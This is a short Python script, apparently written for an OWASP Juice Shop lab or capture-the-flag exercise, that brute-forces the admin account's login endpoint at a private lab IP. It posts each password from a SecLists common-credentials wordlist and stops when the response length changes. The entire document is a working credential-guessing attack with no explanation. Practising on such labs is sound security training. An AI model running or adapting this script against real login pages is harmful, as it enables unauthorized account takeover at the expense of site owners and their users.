#!/usr/bin/python3
import requests
import os
import re

orig_url='http://10.10.225.209/rest/user/login'
# regex = re.compile(r'picoCTF{.*}')
passwords = open('/opt/SecLists/Passwords/Common-Credentials/best1050.txt')

s = requests.Session()
for pw in passwords:
  url = orig_url
  print(pw)
  r = s.post(url, cookies={'language':'en', 'continueCode': 'l5wOojDeg73OnzQ6aB4Z8ERMvyJr0XYAq9pw5xYVWmkj2P1lXLoNbK7vRbkE'}, data={'email': 'admin@juice-sh.op', 'password': pw})
  print(len(r.text))
  # print(r.text)
  if len(r.text) != 26:
    print(r.text)
    break

passwords.close()